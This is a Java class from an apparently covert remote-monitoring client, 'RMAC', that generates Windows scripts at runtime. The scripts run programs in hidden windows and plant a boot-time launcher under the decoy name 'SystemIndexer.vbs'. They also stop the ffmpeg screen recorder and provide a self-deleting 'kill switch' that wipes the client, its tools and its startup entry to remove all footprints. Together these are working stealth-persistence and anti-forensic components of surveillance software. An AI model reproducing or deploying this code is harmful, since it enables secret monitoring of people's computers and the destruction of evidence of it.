package com.rmac.core;

import com.rmac.utils.Constants;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.PrintStream;
import lombok.extern.slf4j.Slf4j;

/**
 * Verifies if all the script files exist and creates them otherwise.
 * <br><br>
 * Scripts are executable shell scripts that are all generated under runtime directory except
 * <i>SysIndexer.vbs</i>.
 * <br><br>
 * These scripts perform tasks that are otherwise not possible from within the running RMAC client
 * process.
 * <br><br>
 * For e.g. one such script is <code>kill.bat</code>, which acts as a kill switch, immediately
 * force-stopping this RMAC client, deleting the RMAC client executable and all of its working
 * directories, including itself.
 * <br><br>
 * <code>kill_ffmpeg.bat</code>
 * <br>
 * This script forcefully kills the ffmpeg.exe process responsible for screen recording.
 * <br><br>
 * <code>run32.vbs</code>
 * <br>
 * This script executes other scripts/cli-programs as a background process.
 * <br><br>
 * <code>startrmac.bat</code>
 * <br>
 * This script starts the RMAC client executable as a background process.
 * <br><br>
 * <code>restartrmac.bat</code>
 * <br>
 * This script re-starts the RMAC client executable as a background process.
 * <br><br>
 * <code>SysAdmin.vbs</code>
 * <br>
 * This script executes the <code>kill.bat</code> script as a background process.
 * <br><br>
 * <code>SysIndexer.vbs</code>
 * <br>
 * This script is generated under the startup location and is responsible to start RMAC everytime
 * the host machine boots.
 * <br><br>
 * <code>kill.bat</code>
 * <br>
 * This script is a kill switch which removes all the footprints generated by this RMAC client.
 * <br>
 */
@Slf4j
public class ScriptFiles implements Runnable {

  Thread thread;
  PrintStream run32_vbs;
  PrintStream systemindexer_vbs;
  PrintStream startrmac_bat;
  PrintStream restartrmac_bat;
  PrintStream kill_bat;
  PrintStream sysadmin_vbs;
  PrintStream kill_ffmpeg_bat;

  public ScriptFiles() {
    thread = new Thread(this, "ScriptFiles");
    thread.start();
  }

  @Override
  public void run() {
    try {
      createKillFFMPEG_Bat();
      createRun32_Vbs();
      createStartRMAC_Bat();
      createRestartRMAC_Bat();
      createSysAdmin_Vbs();
      createSystemIndexer_Vbs();
      createKill_Bat();
      log.info("ScriptFiles successfully created");
    } catch (FileNotFoundException e) {
      log.error("ScriptFiles generation failed", e);
    }
  }

  /**
   * Validate script file <code>kill_ffmpeg.exe</code>
   *
   * @throws FileNotFoundException when verification/correction fails.
   */
  private void createKillFFMPEG_Bat() throws FileNotFoundException {
    File killFfmpegBat = new File(Constants.SCRIPTS_LOCATION + "\\kill_ffmpeg.bat");
    if (killFfmpegBat.exists()) {
      killFfmpegBat.delete();
    }
    kill_ffmpeg_bat = new PrintStream(Constants.SCRIPTS_LOCATION + "\\kill_ffmpeg.bat");
    kill_ffmpeg_bat.println("@echo off");
    kill_ffmpeg_bat.println("PING 1.1.1.1 -n 1 -w 3000 >nul");
    kill_ffmpeg_bat.println("taskkill /f /im ffmpeg.exe");
    kill_ffmpeg_bat.println("PING 1.1.1.1 -n 1 -w 1000 >nul");
  }

  /**
   * Validate script file <code>run32.vbs</code>
   *
   * @throws FileNotFoundException when verification/correction fails.
   */
  private void createRun32_Vbs() throws FileNotFoundException {
    File run32Vbs = new File(Constants.SCRIPTS_LOCATION + "\\run32.vbs");
    if (run32Vbs.exists()) {
      run32Vbs.delete();
    }
    run32_vbs = new PrintStream(Constants.SCRIPTS_LOCATION + "\\run32.vbs");
    run32_vbs.println(
        "CreateObject(\"WScript.Shell\").Run \"\"\"\" + WScript.Arguments(0) + \"\"\"\", 0, true"
    );
  }

  /**
   * Validate script file <code>startrmac.bat</code>
   *
   * @throws FileNotFoundException when verification/correction fails.
   */
  private void createStartRMAC_Bat() throws FileNotFoundException {
    File startRMACBat = new File(Constants.SCRIPTS_LOCATION + "\\startrmac.bat");
    if (startRMACBat.exists()) {
      startRMACBat.delete();
    }
    startrmac_bat = new PrintStream(Constants.SCRIPTS_LOCATION + "\\startrmac.bat");
    startrmac_bat.println(
        "start /B \"\" \"" + Constants.JRE_LOCATION + "\\bin\\java\" -jar \""
            + Constants.CURRENT_LOCATION + "\\RMACClient.jar"
            + "\" \"" + Constants.RUNTIME_LOCATION + "\""
    );
  }

  /**
   * Validate script file <code>restartrmac.bat</code>
   *
   * @throws FileNotFoundException when verification/correction fails.
   */
  private void createRestartRMAC_Bat() throws FileNotFoundException {
    File restartRMACBat = new File(Constants.SCRIPTS_LOCATION + "\\restartrmac.bat");
    if (restartRMACBat.exists()) {
      restartRMACBat.delete();
    }
    restartrmac_bat = new PrintStream(Constants.SCRIPTS_LOCATION + "\\restartrmac.bat");
    restartrmac_bat.println("timeout /t 3");
    restartrmac_bat.println("taskkill /f /im java.exe");
    restartrmac_bat.println("timeout /t 2");
    restartrmac_bat.println(
        "start /B \"\" \"" + Constants.STARTUP_LOCATION + "\\SystemIndexer.vbs\""
    );
  }

  /**
   * Validate script file <code>SysAdmin.vbs</code>
   *
   * @throws FileNotFoundException when verification/correction fails.
   */
  private void createSysAdmin_Vbs() throws FileNotFoundException {
    File sysAdminVbs = new File(Constants.SCRIPTS_LOCATION + "\\SysAdmin.vbs");
    if (sysAdminVbs.exists()) {
      sysAdminVbs.delete();
    }
    sysadmin_vbs = new PrintStream(Constants.SCRIPTS_LOCATION + "\\SysAdmin.vbs");
    sysadmin_vbs.println(
        "CreateObject(\"WScript.Shell\").Run \"\"\"" + Constants.SCRIPTS_LOCATION
            + "\\kill.bat\"\"\", 0, true"
    );
  }

  /**
   * Validate script file <code>SysIndexer.vbs</code>
   *
   * @throws FileNotFoundException when verification/correction fails.
   */
  private void createSystemIndexer_Vbs() throws FileNotFoundException {
    File systemIndexerVbs = new File(Constants.STARTUP_LOCATION + "\\SystemIndexer.vbs");
    if (systemIndexerVbs.exists()) {
      systemIndexerVbs.delete();
    }
    systemindexer_vbs = new PrintStream(Constants.STARTUP_LOCATION + "\\SystemIndexer.vbs");
    systemindexer_vbs.println(
        "CreateObject(\"Wscript.Shell\").Run \"\"\"" + Constants.JRE_LOCATION
            + "\\bin\\java\"\" -jar \"\"" + Constants.CURRENT_LOCATION
            + "\\RMACClient.jar\"\" \"\"" + Constants.RUNTIME_LOCATION + "\"\"\", 0, False"
    );
    systemindexer_vbs.println(
        "CreateObject(\"Wscript.Shell\").Run \"\"\"" + Constants.JRE_LOCATION
            + "\\bin\\java\"\" -jar \"\"" + Constants.CURRENT_LOCATION
            + "\\RMACUpdater.jar\"\" \"\"" + Constants.RUNTIME_LOCATION + "\"\"\", 0, False"
    );
  }

  /**
   * Validate script file <code>kill.bat</code>
   *
   * @throws FileNotFoundException when verification/correction fails.
   */
  private void createKill_Bat() throws FileNotFoundException {
    File killBat = new File(Constants.SCRIPTS_LOCATION + "\\kill.bat");
    if (killBat.exists()) {
      killBat.delete();
    }
    kill_bat = new PrintStream(Constants.SCRIPTS_LOCATION + "\\kill.bat");
    kill_bat.println("timeout /t 4");
    kill_bat.println("taskkill /f /im java.exe");
    kill_bat.println("rd /s /q \"" + Constants.JRE_LOCATION + "\"");
    kill_bat.println("rd /s /q \"" + Constants.SCRIPTS_LOCATION + "\"");
    kill_bat.println("rd /s /q \"" + Constants.CONFIG_LOCATION + "\"");
    kill_bat.println("del /f /q \"" + Constants.RUNTIME_LOCATION + "\\ffmpeg.exe\"");
    kill_bat.println("del /f /q \"" + Constants.RUNTIME_LOCATION + "\\nircmd.exe\"");
    kill_bat.println("rd /s /q \"" + Constants.MEGACMD_LOCATION + "\"");
    kill_bat.println("del /f /q \"" + Constants.STARTUP_LOCATION + "\\SystemIndexer.vbs\"");
    kill_bat.println("rd /q /s \"" + Constants.RUNTIME_LOCATION + "\\update\"");
    kill_bat.println("rd /q /s \"" + Constants.CURRENT_LOCATION + "\"");
    kill_bat.println("del \"%~f0\"");
  }
}
